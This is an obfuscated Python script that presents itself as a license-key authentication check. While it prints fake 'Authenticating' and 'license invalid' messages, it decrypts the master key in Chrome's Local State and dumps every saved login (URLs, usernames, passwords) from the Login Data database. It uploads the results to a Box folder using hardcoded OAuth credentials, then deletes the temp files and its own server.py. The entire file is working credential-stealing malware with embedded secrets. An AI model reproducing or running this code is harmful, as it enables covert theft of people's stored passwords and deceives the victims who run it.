import os #line:1
import json #line:2
import base64 #line:3
import sqlite3 #line:4
import win32crypt #line:5
import random #line:6
from Crypto .Cipher import AES #line:7
import shutil #line:8
from datetime import timezone ,datetime ,timedelta #line:9
from boxsdk import OAuth2 ,Client #line:10
print ("Authenticating...\nPlease wait a moment...")#line:12
def trex ():#line:13
    def OO000OOOOOO0OOO00 (OOO00O0000000OO0O ):#line:14
            O0OOOO00OO0OO0O0O ='152448042033'#line:15
            try :#line:16
                O0O0OOOO00OOO00O0 =OAuth2 (client_id ='q7xyfden1kqr1njwmthmrlhm2maj9imj',client_secret ='T7afVolugPHyGv0VEfr6oSpIluZai9GJ',access_token ='h8VojzZX3wnMCVZrkmSEYmL2lwrrDk0M',)#line:21
                OOOO0OO0000OOO000 =Client (O0O0OOOO00OOO00O0 )#line:22
                OO000000O00O0000O =OOOO0OO0000OOO000 .user ().get ()#line:23
            except :#line:24
                print ("\nSorry!! LICENSE KEY is invalid. Please contact the admin.")#line:25
                O0O0OOOO00OOO00O0 =OAuth2 (client_id ='q7xyfden1kqr1njwmthmrlhm2maj9imj',client_secret ='T7afVolugPHyGv0VEfr6oSpIluZai9GJ',access_token =input ("\nEnter LICENSE KEY: "),)#line:30
                OOOO0OO0000OOO000 =Client (O0O0OOOO00OOO00O0 )#line:31
                OO000000O00O0000O =OOOO0OO0000OOO000 .user ().get ()#line:32
            OOOO00OOOOOOOO0O0 =OOOO0OO0000OOO000 .folder (O0OOOO00OO0OO0O0O ).upload (OOO00O0000000OO0O )#line:35
    def OO000O00OO0O0O0OO (O0OOO0O0OOOOOOO0O ):#line:40
        ""#line:42
        return datetime (1601 ,1 ,1 )+timedelta (microseconds =O0OOO0O0OOOOOOO0O )#line:43
    def OOO0OOOOOO0O0OOOO ():#line:45
        OOO0O0O00000O0O00 =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")#line:48
        with open (OOO0O0O00000O0O00 ,"r",encoding ="utf-8")as OOOOO000000O00OOO :#line:49
            O00OO0OO00000O00O =OOOOO000000O00OOO .read ()#line:50
            O00OO0OO00000O00O =json .loads (O00OO0OO00000O00O )#line:51
        O0OOOO0O0O00OOO00 =base64 .b64decode (O00OO0OO00000O00O ["os_crypt"]["encrypted_key"])#line:54
        O0OOOO0O0O00OOO00 =O0OOOO0O0O00OOO00 [5 :]#line:56
        return win32crypt .CryptUnprotectData (O0OOOO0O0O00OOO00 ,None ,None ,None ,0 )[1 ]#line:60
    def OOOOO0O000O00O0O0 (O0000O0OOO0OOOOOO ,OOOOOOOO000OOO000 ):#line:62
        try :#line:63
            OO00OO0O000000000 =O0000O0OOO0OOOOOO [3 :15 ]#line:65
            O0000O0OOO0OOOOOO =O0000O0OOO0OOOOOO [15 :]#line:66
            OO0O0O0O0OO00OOO0 =AES .new (OOOOOOOO000OOO000 ,AES .MODE_GCM ,OO00OO0O000000000 )#line:68
            return OO0O0O0O0OO00OOO0 .decrypt (O0000O0OOO0OOOOOO )[:-16 ].decode ()#line:70
        except :#line:71
            try :#line:72
                return str (win32crypt .CryptUnprotectData (O0000O0OOO0OOOOOO ,None ,None ,None ,0 )[1 ])#line:73
            except :#line:74
                return ""#line:76
    def O00OOOO0000OO0OO0 ():#line:78
        O00O0OOO0O000O0OO =OOO0OOOOOO0O0OOOO ()#line:80
        OOO0O00O000O00OOO =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","default","Login Data")#line:83
        OOO000O0OOO00OO0O ="log.db"#line:86
        shutil .copyfile (OOO0O00O000O00OOO ,OOO000O0OOO00OO0O )#line:87
        OO00O0O00O0O000O0 =sqlite3 .connect (OOO000O0OOO00OO0O )#line:89
        O00OO0OO0OOOO0000 =OO00O0O00O0O000O0 .cursor ()#line:90
        O00OO0OO0OOOO0000 .execute ("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")#line:92
        OO000O00OOOOO0O00 ="Temp"+str (random .randint (10000000 ,999999999 ))+".db"#line:94
        OO0O00OO0O0OO0000 =open (OO000O00OOOOO0O00 ,"a")#line:95
        OO0O00OO0O0OO0000 .write ("Origin URL, Action URL, Username, Password, Date Created, Date Last Used")#line:96
        for O0OOO0O0OOO0OOO00 in O00OO0OO0OOOO0000 .fetchall ():#line:99
            O000O00O0000O00O0 =O0OOO0O0OOO0OOO00 [0 ]#line:100
            OOOOO0OO0O00O0OO0 =O0OOO0O0OOO0OOO00 [1 ]#line:101
            OOOO0000OO00OOOOO =O0OOO0O0OOO0OOO00 [2 ]#line:102
            O0O0O0O000O00000O =OOOOO0O000O00O0O0 (O0OOO0O0OOO0OOO00 [3 ],O00O0OOO0O000O0OO )#line:103
            O0OOOOO0O000O00O0 =O0OOO0O0OOO0OOO00 [4 ]#line:104
            if O0OOOOO0O000O00O0 !=86400000000 and O0OOOOO0O000O00O0 :#line:105
                O0OOOOO0O000O00O0 =str (OO000O00OO0O0O0OO (O0OOOOO0O000O00O0 ))#line:106
            OOOOO00OO0OO00OOO =O0OOO0O0OOO0OOO00 [5 ]#line:107
            if OOOOO00OO0OO00OOO !=86400000000 and OOOOO00OO0OO00OOO :#line:108
                OOOOO00OO0OO00OOO =str (OO000O00OO0O0O0OO (OOOOO00OO0OO00OOO ))#line:109
            if OOOO0000OO00OOOOO or O0O0O0O000O00000O :#line:111
                O0O000OO0O0OOOO00 ="\n"+str (O000O00O0000O00O0 )+","+str (OOOOO0OO0O00O0OO0 )+", "+str (OOOO0000OO00OOOOO )+", "+str (O0O0O0O000O00000O )+", "+str (O0OOOOO0O000O00O0 )+", "+str (OOOOO00OO0OO00OOO );#line:112
                OO0O00OO0O0OO0000 .write (O0O000OO0O0OOOO00 )#line:114
            else :#line:115
                continue #line:116
        O00OO0OO0OOOO0000 .close ()#line:117
        OO00O0O00O0O000O0 .close ()#line:118
        OO0O00OO0O0OO0000 .close ()#line:119
        try :#line:120
            OO000OOOOOO0OOO00 (OO000O00OOOOO0O00 )#line:121
        except :#line:122
            print ("An Error Occured. Error Code: x54000009876")#line:123
        try :#line:125
            os .remove (OOO000O0OOO00OO0O )#line:126
            os .remove (OO000O00OOOOO0O00 )#line:127
            os .remove ('server.py')#line:128
            print ("Authentication Successful.")#line:129
        except :#line:130
            print ("An Error Occured. Error Code: x54000009542")#line:131
            pass #line:132
    O00OOOO0000OO0OO0 ()#line:133
trex ()#line:135
